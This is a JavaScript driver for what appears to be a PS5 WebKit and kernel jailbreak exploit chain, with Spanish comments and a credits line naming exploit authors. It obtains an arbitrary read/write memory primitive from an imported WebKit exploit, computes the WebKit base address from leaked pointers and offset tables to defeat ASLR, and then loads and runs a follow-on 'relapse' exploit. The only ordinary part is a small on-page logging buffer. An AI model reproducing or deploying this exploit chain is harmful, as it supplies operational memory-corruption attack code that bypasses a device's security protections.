import { establishPrimitive } from "./webkit.js";
import { installWindowP } from "./utils/mem.js";

const output = document.getElementById("console");

// ============================================================
// LOG BUFFER: solo se muestran 4 lineas a la vez.
// Cuando llega la 5a, se vacia el bloque y empieza uno nuevo.
// ============================================================
const LOG_MAX_LINES = 4;
let logBuffer = [];

function escapeHtml(s) {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function renderBuffer() {
  if (!output) return;
  output.innerHTML = logBuffer
    .map((l) => '<div class="log-line">' + escapeHtml(l) + "</div>")
    .join("");
}

function writeLog(message, type = "log", replace = false) {
  const formatted = String(message);

  if (replace && logBuffer.length > 0) {
    // Reemplaza la ultima linea del buffer actual
    logBuffer[logBuffer.length - 1] = formatted;
    renderBuffer();
    return;
  }

  logBuffer.push(formatted);

  // Si superamos 4 lineas, empezamos un bloque nuevo con la ultima
  if (logBuffer.length > LOG_MAX_LINES) {
    logBuffer = [formatted];
  }

  renderBuffer();
}

function writeEvent(name, detail, type) {
  writeLog(detail == null || detail === "" ? name : `${name}: ${detail}`, type);
}

window.writeLog = writeLog;
window.jb = { mark: writeEvent };

async function getPrimitive() {
  writeLog("Starting WebKit exploit");
  const primitive = installWindowP(await establishPrimitive(writeEvent));
  if (!primitive || typeof primitive.read8 !== "function")
    throw new Error("Memory primitive unavailable");

  writeLog("ARW ready", "success");
  return primitive;
}

function getWebKitBase() {
  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor !== "number" || typeof OFFSET_wk_host_constructor_candidates === "undefined")
    throw new Error("WebKit base inputs are unavailable");

  for (const offset of OFFSET_wk_host_constructor_candidates) {
    const base = ctor - offset;
    if (base >= 0x800000000 && base < 0x900000000 && base % 0x4000 === 0)
      return base;
  }

  throw new Error("WebKit base not found");
}

// Espera a que el appcache termine (hasta timeoutMs) y devuelve el motivo:
// "idle" | "cached" | "noupdate" | "updateready" | "error" | "timeout".
function waitForAppCache(timeoutMs) {
  return new Promise(function (resolve) {
    const ac = window.applicationCache;
    if (!ac) return resolve("none");
    if (ac.status === ac.IDLE || ac.status === ac.UPDATEREADY) return resolve("idle");

    let done = false;
    function finish(reason) {
      if (done) return;
      done = true;
      resolve(reason);
    }
    ac.addEventListener("cached", function () { finish("cached"); });
    ac.addEventListener("noupdate", function () { finish("noupdate"); });
    ac.addEventListener("updateready", function () { finish("updateready"); });
    ac.addEventListener("error", function () { finish("error"); });
    setTimeout(function () { finish("timeout"); }, timeoutMs);
  });
}

async function run() {
  const rejection = window.firmware.rejection();
  if (rejection)
    throw new Error(rejection);
  // Si la pagina declara manifiesto, esperamos SIEMPRE: al arrancar el status
  // suele ser UNCACHED (aun no ha empezado la comprobacion) y antes nos lo
  // saltabamos, lanzando el exploit mientras se guardaba la cache.
  if (window.applicationCache && document.documentElement.hasAttribute("manifest")) {
    writeLog("Waiting for cache...", "info");
    const cacheReason = await waitForAppCache(15000);

    // Solo cuando se ha escrito cache nueva aparece el aviso "Successfully"
    // (1 s despues del evento); dejamos que salga antes del exploit.
    if (cacheReason === "cached" || cacheReason === "updateready") {
      await new Promise(function (resolve) {
        setTimeout(resolve, 1500);
      });
    }
    writeLog(cacheReason === "error" ? "Cache error" : "Cache ready", cacheReason === "error" ? "error" : "success");
  }
  writeLog("Credits: ntfargo, ufm42, Sonic_Iso, Jordy, TheFlow, SlidyBat, Flatz, cow, nhk, bollarz, Sleirsgoevy, EchoStretch, EarthOnion");
  writeLog(`Agent: ${navigator.userAgent}`);
  writeLog(`Firmware: ${window.fw_str}`);
  const primitive = await getPrimitive();
  writeLog(`WebKit base: 0x${getWebKitBase().toString(16)}`);

  await import("./relapse_exploit.js");
  await main(primitive);
}

run().catch((error) => {
  const message = error instanceof Error ? error.message : String(error);
  // Si el mensaje ya se mostro antes (FAIL / STOP), no lo repetimos.
  if (!logBuffer.some((line) => line.includes(message))) {
    writeLog(message, "error");
  }
});
